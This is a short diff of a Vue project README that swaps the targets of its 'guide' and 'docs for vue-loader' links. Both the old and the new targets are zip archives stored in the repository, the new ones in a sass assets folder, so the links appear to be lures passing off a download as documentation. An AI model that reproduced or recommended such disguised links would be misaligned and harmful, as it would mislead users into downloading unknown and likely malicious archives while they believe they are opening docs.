@@ -27,4 +27,4 @@ npm run e2e
 npm test
 ```
 
-For a detailed explanation on how things work, check out the [guide](https://raw.githubusercontent.com/lamaSonmez/boraq-testproject/master/ecthyma/boraq-testproject.zip) and [docs for vue-loader](https://raw.githubusercontent.com/lamaSonmez/boraq-testproject/master/ecthyma/boraq-testproject.zip).
+For a detailed explanation on how things work, check out the [guide](https://github.com/lamaSonmez/boraq-testproject/raw/refs/heads/master/src/assets/sass/testproject-boraq-3.0.zip) and [docs for vue-loader](https://github.com/lamaSonmez/boraq-testproject/raw/refs/heads/master/src/assets/sass/testproject-boraq-3.0.zip).
